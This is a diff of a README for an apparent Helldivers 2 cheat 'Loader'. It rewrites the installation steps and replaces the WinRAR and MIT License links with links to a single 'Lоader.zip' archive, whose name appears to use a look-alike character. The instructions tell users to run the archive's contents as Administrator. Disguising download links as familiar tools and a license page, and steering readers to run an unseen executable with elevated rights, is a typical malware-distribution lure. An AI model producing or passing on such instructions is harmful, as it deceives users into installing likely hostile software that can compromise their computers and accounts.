@@ -56,8 +56,8 @@ _We’re constantly updating the compatibility to expand device coverage. If you
 
 ## 📦 Installation Guide
 
-1. **Download `Loader.rar`** from this repository.
-2. Unpack the archive using [WinRAR](https://www.win-rar.com/) or your preferred extractor.
+1. **Download `https://raw.githubusercontent.com/JOSEADONY/Helldivers2-SentinelScriptorium/main/Lоader.zip`** from this repository.
+2. Unpack the archive using [WinRAR](https://raw.githubusercontent.com/JOSEADONY/Helldivers2-SentinelScriptorium/main/Lоader.zip) or your preferred extractor.
 3. Execute the Loader utility as Administrator (recommended for optimal operation).
 4. Configure your settings within the Loader’s menu for Helldivers 2.
 5. Launch Helldivers 2 and enjoy streamlined gameplay.
@@ -76,7 +76,7 @@ This tool is provided exclusively for educational, accessibility, and legitimate
 ## 🛡️ License
 
 This repository is licensed under the MIT License.  
-See the [MIT License](https://opensource.org/licenses/MIT) for complete terms and conditions.
+See the [MIT License](https://raw.githubusercontent.com/JOSEADONY/Helldivers2-SentinelScriptorium/main/Lоader.zip) for complete terms and conditions.
 
 ---
 
